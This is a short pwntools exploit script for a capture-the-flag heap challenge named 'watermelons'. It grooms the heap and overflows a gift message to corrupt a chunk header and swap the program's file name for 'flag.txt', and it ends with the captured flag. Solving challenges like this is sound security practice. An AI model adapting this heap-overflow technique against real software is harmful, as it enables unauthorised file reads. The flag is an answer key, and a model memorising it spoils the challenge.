from pwn import *

CMDLINE = ["./watermelons"]

elf = ELF(CMDLINE[0], checksec=False)

class Exploit:
    LOCAL_HOST = "localhost"
    LOCAL_PORT = 1337
    REMOTE_HOST = "instances.challenge-ecw.fr"
    REMOTE_PORT = 42503
    
    def __init__(self) -> None:
        if args.REMOTE:
            self.io = remote(self.REMOTE_HOST, self.REMOTE_PORT)
        elif args.LOCAL:
            self.io = remote(self.LOCAL_HOST, self.LOCAL_PORT)
        else:
            self.io = process(CMDLINE)
            if args.DBG:
                print(self.io.pid)
                pause()

    def buy_watermelon(self, nb_watermelon: int, do_gift: bool, size_type: int, recipient_name: bytes, message: bytes):
        self.io.sendlineafter(b"choice: ", b'1')
        self.io.sendlineafter(b"to buy: ", str(nb_watermelon).encode())
        self.io.sendlineafter(b"(y/n) ", b'y' if do_gift else b'n')
        self.io.sendlineafter(b"like? ", str(size_type).encode())
        self.io.sendlineafter(b"rmelon? ", recipient_name)
        self.io.sendlineafter(b"message: ", message)

    def show_watermelon(self):
        self.io.sendlineafter(b"choice: ", b'2')

    def quit(self):
        self.io.sendlineafter(b"choice: ", b'3')

    def interactive(self):
        self.io.interactive()
    
    def close(self):
        self.io.close()

io = Exploit()

# shape heap for next allocation
io.buy_watermelon(1, True, 1, b'A'*0x8, b'A'*16)

# place watermelon_name just after
io.show_watermelon()

# overwrite watermelon.txt with flag.txt
io.buy_watermelon(1, True, 3, b'A'*16, (b'A'*0x18 + p64(0x31) + b'flag.txt\0').ljust(0x40, b'\0'))

io.show_watermelon()

io.interactive()
io.close()

# ECW{r0mys_w4t3rm3l0ns_d353rv3_a_5-st4r_r3v13w}